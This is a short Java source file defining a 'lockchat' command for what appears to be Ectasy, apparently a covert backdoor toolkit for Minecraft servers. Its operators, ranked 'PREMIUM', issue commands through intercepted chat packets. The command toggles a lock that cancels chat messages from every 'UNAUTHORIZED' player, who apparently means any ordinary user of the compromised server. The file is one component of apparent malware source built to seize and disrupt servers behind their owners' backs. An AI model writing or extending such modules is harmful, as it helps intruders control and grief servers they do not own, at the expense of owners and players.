package dev.ectasy.impl.commands.premium;

import com.github.retrooper.packetevents.event.PacketReceiveEvent;
import com.github.retrooper.packetevents.wrapper.play.client.WrapperPlayClientChatMessage;
import dev.ectasy.Ectasy;
import dev.ectasy.api.commands.AbstractCommand;
import dev.ectasy.api.commands.CommandInfo;
import dev.ectasy.api.data.Rank;
import dev.ectasy.api.data.User;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
        name = "lockchat",
        description = "Locks the chat.",
        rank = Rank.PREMIUM,
        blatant = true,
        listener = true
)
public class CommandLockChat extends AbstractCommand implements Listener {
    private boolean locked = false;

    @Override
    public void execute(User user, PacketReceiveEvent event, WrapperPlayClientChatMessage packet, String[] args){
        locked = !locked;
        user.sendMessage("Chat is now " + user.getMainColor() + (locked ? "locked" : "unlocked") + user.getSecondaryColor() + ".");
    }

    @EventHandler
    public void onChat(AsyncPlayerChatEvent e){
        if(locked && Ectasy.getInstance().getUser(e.getPlayer()).getRank() == Rank.UNAUTHORIZED){
            e.setCancelled(true);
        }
    }

}
